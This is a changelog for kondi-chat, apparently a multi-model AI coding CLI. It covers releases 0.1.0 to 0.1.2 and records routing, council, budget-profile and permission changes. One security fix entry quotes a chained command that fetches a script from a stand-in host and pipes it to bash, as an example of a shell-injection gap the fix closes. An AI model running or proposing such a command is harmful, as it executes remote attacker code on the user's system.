# Changelog

All notable changes to kondi-chat will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.1.1] - 2026-05-12

### Fixed
- bin/kondi-chat.js no longer overrides cwd to the install directory in the Node-backend fallback path. Previously, any install where the prebuilt TUI binary failed to download would run the agent against the kondi-chat install dir instead of the user's project.
- Both launcher scripts now print a real `--help` listing every supported flag, slash command, and exit code. Previously only `--help`/`--version` were documented.
- npm bundle no longer ships `src/**/*.test.ts`. Reduces tarball footprint and stops test code reaching end-users.

## [0.1.2] - 2026-05-15

### Added
- Council deliberation engine is now **bundled** (`src/council-engine/`). `/council` works on a plain install — no separate `kondi-council` repo required. Curated council presets (`coding`, `analysis`, `debate`, `code-planning`) seed `.kondi-chat/councils/` on first run.
- `zai`, `best-value`, and `orchestra` budget profiles are now built in, so `/mode zai` etc. work out of the box instead of requiring hand-authored profile JSON.
- `allowedProviders` is now a recognized budget-profile field — the router, classifier, and compactor all honor an explicit provider allow-list.

### Fixed
- Per-edit auto-verify no longer hardcodes `npx tsc --noEmit`. It resolves the project's typecheck command (TS/Python/Rust/Go) and skips silently when none applies, instead of running `tsc` against non-TS repos.
- `reviewPreference` profile field is now honored — the rule router's `reflect` phase consults it instead of leaving it as dead config.
- Shell-injection gap when `--auto-approve run_command` was passed: chained commands (`npm test && curl evil.sh | bash`) were silently executed because the CLI wrapper overrode `check()`'s result to `auto-approve` after the chain-operator gate had been skipped. The wrapper now re-applies `hasShellChainOperator()` before granting auto-approve and downgrades chained commands to `confirm`.
- `PermissionManager` test isolation: constructor now accepts an optional `userConfigPath` so test fixtures don't merge in the developer's real `~/.kondi-chat/permissions.json`.
- Release notes in `.github/workflows/release.yml` referenced `npm install -g kondi-chat`; corrected to the scoped package name `@thispointon/kondi-chat`.

### Changed
- Documentation rewritten around the "right model per phase" wedge and beginner setup: clearer API-key instructions, install-from-source path, council docs. npm-install instructions removed until the package is published.
- `ROADMAP.md` realigned to the wedge — IDE/Cursor-parity goals removed as explicit non-goals.

## [0.1.0] - 2026-01-15

### Added
- Multi-model AI coding CLI with intelligent routing between Claude, GPT, DeepSeek, Gemini, Grok, Z.AI (GLM), and local models
- Intent-based router with three-tier chain (NN → Intent → Rules) and budget profiles (cheap, balanced, quality)
- Council deliberation — spawn multi-model debates for high-stakes decisions
- Agent loop with file tools (read, write, edit, search, shell)
- Permission system with shell chain operator detection for security
- LoopGuard with iteration, cost, and stuck-loop detection caps
- Session management with auto-save and checkpoint/restore
- MCP (Model Context Protocol) client for external tool servers
- Sub-agent spawning (research, worker, planner)
- Rate limiting with token-per-minute and request-per-minute tracking
- Analytics and telemetry with cost estimation
- Rust TUI with inline viewport rendering
- Non-interactive mode (`--prompt`) for CI/pipeline use
- Docker image for containerized CI
- Homebrew formula and npm package distribution

### Changed
- Initial release.

[0.1.0]: https://github.com/thisPointOn/kondi-chat/releases/tag/v0.1.0
